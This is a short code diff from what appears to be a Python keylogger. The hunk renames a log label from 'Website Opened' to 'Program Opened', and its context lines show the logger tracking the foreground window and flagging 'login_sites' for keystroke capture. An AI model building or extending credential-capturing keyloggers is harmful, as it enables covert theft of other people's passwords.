@@ -61,14 +61,14 @@ def on_press(key):
     new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
     if old_app == '':
         old_app = new_app
-        website = f'Website Opened: {new_app}\n\n'
+        website = f'Program Opened: {new_app}\n\n'
     # check when the program has been changed before writing into the log file
     # i.e. the target program was closed
     elif new_app != old_app:
         write_file(logged_data, message, website)
         old_app = new_app
     elif new_app == old_app:
-        website = f'Website Opened: {new_app}\n\n'
+        website = f'Program Opened: {new_app}\n\n'
    
     if new_app in login_sites:
         if  len(times) == 0:
